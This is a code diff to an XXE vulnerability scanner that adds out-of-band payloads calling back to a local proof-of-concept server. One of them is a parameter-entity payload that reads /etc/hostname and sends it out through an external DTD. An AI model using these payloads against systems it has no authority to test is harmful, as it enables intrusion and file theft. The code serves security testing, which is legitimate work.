@@ -236,6 +236,11 @@ class XXEScanner(BaseScanner):
         if not self.collaborator_domain:
             return []
 
+        # If using local PoC server, use direct callback URLs (not subdomain pattern)
+        if hasattr(self, "_poc_server") and self._poc_server:
+            return self._build_local_oob_payloads()
+
+        # External collaborator (interact.sh etc.) — uses subdomain pattern
         payloads = []
 
         # HTTP OOB
@@ -282,6 +287,64 @@ class XXEScanner(BaseScanner):
                 f'<root>test</root>'
             ),
             description="Blind XXE DNS-only callback (bypasses HTTP egress filters)",
+        ))
+
+        return payloads
+
+    def _build_local_oob_payloads(self) -> List[XXEPayload]:
+        """OOB payloads using local PoC server (direct HTTP callback URLs)."""
+        payloads = []
+        base = self._poc_server.base_url  # http://ip:port
+
+        # HTTP OOB — direct callback URL
+        cb_url = self._poc_server.oob_url("xxe", uid=self.canary)
+        payloads.append(XXEPayload(
+            name="oob_http_basic",
+            variant=XXEVariant.OOB_HTTP,
+            xml=(
+                f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                f'<!DOCTYPE foo [\n'
+                f'  <!ENTITY xxe SYSTEM "{cb_url}">\n'
+                f']>\n'
+                f'<root><data>&xxe;</data></root>'
+            ),
+            description="Blind XXE via HTTP callback (local PoC server)",
+        ))
+
+        # HTTP OOB with file exfiltration via parameter entity
+        # DTD served from our PoC server collects exfiled data
+        exfil_uid = self._generate_canary()
+        exfil_cb = self._poc_server.oob_url("xxe_exfil", uid=exfil_uid)
+        payloads.append(XXEPayload(
+            name="oob_exfil_param_entity",
+            variant=XXEVariant.OOB_HTTP,
+            xml=(
+                f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                f'<!DOCTYPE foo [\n'
+                f'  <!ENTITY % file SYSTEM "file:///etc/hostname">\n'
+                f'  <!ENTITY % dtd SYSTEM "{base}/cb/{exfil_uid}">\n'
+                f'  %dtd;\n'
+                f'  %send;\n'
+                f']>\n'
+                f'<root><data>test</data></root>'
+            ),
+            description="Blind XXE data exfil via external DTD + parameter entity (local)",
+        ))
+
+        # HTTP-only OOB (no DNS needed — local server is IP-based)
+        cb_url2 = self._poc_server.oob_url("xxe_http", uid=self._generate_canary())
+        payloads.append(XXEPayload(
+            name="oob_http_alt",
+            variant=XXEVariant.OOB_HTTP,
+            xml=(
+                f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                f'<!DOCTYPE foo [\n'
+                f'  <!ENTITY % xxe SYSTEM "{cb_url2}">\n'
+                f'  %xxe;\n'
+                f']>\n'
+                f'<root>test</root>'
+            ),
+            description="Blind XXE HTTP callback via parameter entity (local)",
         ))
 
         return payloads
@@ -572,12 +635,20 @@ class XXEScanner(BaseScanner):
     def _inject_poc_server_collaborator(self, context: ScanContext) -> None:
         """Use local PoC server as collaborator if available and no external one configured."""
         poc_server = context.extra.get("poc_server") if context.extra else None
-        if poc_server and not self.collaborator_domain:
-            # Use the PoC server's host:port as the collaborator domain
-            self.collaborator_domain = f"{poc_server.host}:{poc_server.port}"
+        if poc_server and poc_server.is_running and not self.collaborator_domain:
+            self._poc_server = poc_server
             self.canary = self._generate_canary()
-            # Register the OOB callback so the server knows to expect it
-            poc_server.register_oob_payload(self.canary, {"scanner": "xxe", "url": context.url})
+            # Register OOB callback and store the server's base URL info
+            from urllib.parse import urlparse
+            parsed = urlparse(poc_server.base_url)
+            self._poc_base_netloc = parsed.netloc  # e.g. "10.0.11.240:41641"
+            # Register the canary so the server expects it
+            poc_server.register_oob_payload(
+                uid=self.canary, vuln_type="xxe", target_url=context.url,
+            )
+            # Set collaborator_domain as a flag so _build_oob_payloads runs;
+            # the actual payloads are overridden in _build_local_oob_payloads
+            self.collaborator_domain = self._poc_base_netloc
 
     async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
         """Main scan: test for XXE on XML-accepting endpoints"""
